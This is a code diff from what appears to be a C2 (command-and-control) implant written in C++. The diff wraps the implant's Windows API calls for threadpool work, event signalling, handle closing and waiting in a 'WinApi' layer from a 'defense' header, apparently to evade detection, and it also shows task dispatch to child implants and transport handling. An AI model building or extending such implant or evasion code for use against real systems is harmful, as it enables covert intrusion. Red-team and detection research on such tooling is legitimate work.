@@ -96,6 +96,7 @@ while (true) {
 #include "comms/queues.h"
 #include "data/uuid7.h"
 #include "_debug/debug.h"
+#include "defense/winapi.h"
 
 // ======================================================================================
 // Global Vars (own file?)
@@ -124,7 +125,7 @@ VOID CALLBACK ChildRouterWorker(PTP_CALLBACK_INSTANCE Instance, PVOID Context, P
         DEBUG_LOG("[-] [ChildRouterWorker] Route lookup failed for child UUID: " << ctx->implant_uuid);
         std::cerr << "[-] Route lookup failed for child UUID: " << ctx->implant_uuid << std::endl;
         delete ctx;
-        CloseThreadpoolWork(Work);
+        WinApi::CloseThreadpoolWork(Work);
         return;
     }
 
@@ -150,13 +151,13 @@ VOID CALLBACK ChildRouterWorker(PTP_CALLBACK_INSTANCE Instance, PVOID Context, P
 
         if (data_added) {
             DEBUG_LOG("[ChildRouterWorker] Data added to queue. Signaling h_data_ready_event.");
-            SetEvent(h_data_ready_event);
+            WinApi::SetEvent(h_data_ready_event);
         }
     }
 
     DEBUG_LOG("[ChildRouterWorker] Worker cleanup for child: " << ctx->implant_uuid);
     delete ctx;
-    CloseThreadpoolWork(Work);
+    WinApi::CloseThreadpoolWork(Work);
 }
 
 void C2Implant::dispatch_to_child_router(const nlohmann::json& task, const std::string implant_uuid) {
@@ -165,10 +166,10 @@ void C2Implant::dispatch_to_child_router(const nlohmann::json& task, const std::
     ChildRouteContext* ctx = new ChildRouteContext{ task, implant_uuid };
 
     // Toss it to the OS Threadpool
-    PTP_WORK work_item = CreateThreadpoolWork(ChildRouterWorker, ctx, NULL);
+    PTP_WORK work_item = WinApi::CreateThreadpoolWork(ChildRouterWorker, ctx, NULL);
     if (work_item) {
         DEBUG_LOG("[C2Implant::dispatch_to_child_router] Submitting Work Item to Threadpool");
-        SubmitThreadpoolWork(work_item);
+        WinApi::SubmitThreadpoolWork(work_item);
         DEBUG_LOG("Task handed to background child router for: " << implant_uuid);
     }
     else {
@@ -201,21 +202,21 @@ VOID CALLBACK TaskHandler(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WOR
 
     // 5. Wake up the main cycle() loop to send the response
     DEBUG_LOG("[TaskHandler] Signaling h_data_ready_event");
-    SetEvent(h_data_ready_event);
+    WinApi::SetEvent(h_data_ready_event);
 
     // 6. Cleanup
     delete task_ptr;
-    CloseThreadpoolWork(Work);
+    WinApi::CloseThreadpoolWork(Work);
 }
 
 void C2Implant::dispatch_to_threadpool(const nlohmann::json& task) {
     DEBUG_LOG("[C2Implant::dispatch_to_threadpool] Dispatching local task to OS Threadpool");
     nlohmann::json* task_context = new nlohmann::json(task);
     //yeet into OS threadpool
-    PTP_WORK work_item = CreateThreadpoolWork(TaskHandler, task_context, NULL);
+    PTP_WORK work_item = WinApi::CreateThreadpoolWork(TaskHandler, task_context, NULL);
     if (work_item) {
         DEBUG_LOG("[C2Implant::dispatch_to_threadpool] Work item submitted.");
-        SubmitThreadpoolWork(work_item);
+        WinApi::SubmitThreadpoolWork(work_item);
     }
     else {
         DEBUG_LOG("[-] [C2Implant::dispatch_to_threadpool] Threadpool submission failed!");
@@ -406,7 +407,7 @@ void C2Implant::update_transports() {
             //checked h_inbox_ != invalid handle
             if (h_outbox_ != INVALID_HANDLE_VALUE) {
                 DEBUG_LOG("[C2Implant::update_transports] Cleaning up lingering h_outbox_");
-                CloseHandle(h_outbox_);
+                WinApi::CloseHandle(h_outbox_);
                 h_outbox_ = INVALID_HANDLE_VALUE;
             }
 
@@ -496,7 +497,7 @@ void C2Implant::update_transports() {
             //checked h_outbox_ != invalid handle
             if (h_inbox_ != INVALID_HANDLE_VALUE) {
                 DEBUG_LOG("[C2Implant::update_transports] Cleaning up lingering h_inbox_");
-                CloseHandle(h_inbox_);
+                WinApi::CloseHandle(h_inbox_);
                 h_inbox_ = INVALID_HANDLE_VALUE;
             }
 
@@ -572,13 +573,13 @@ void C2Implant::cycle() {
             // --- PIPE MODE ---
             // Wait for either the Pipe (Index 0) or the Worker (Index 1)
             HANDLE handles[2] = { h_in_event, h_data_ready_event };
-            result = WaitForMultipleObjects(2, handles, FALSE, timeout);
+            result = WinApi::WaitForMultipleObjects(2, handles, FALSE, timeout);
         }
         else {
             // --- HTTP/non handle based comms MODE ---
             // We ONLY wait for the Worker. The "Fetch" happens via the timeout.
             //if no task, this is effectively the sleep. 
-            result = WaitForSingleObject(h_data_ready_event, timeout);
+            result = WinApi::WaitForSingleObject(h_data_ready_event, timeout);
         }
 
         // --- Event Handling/Dispatcher ---
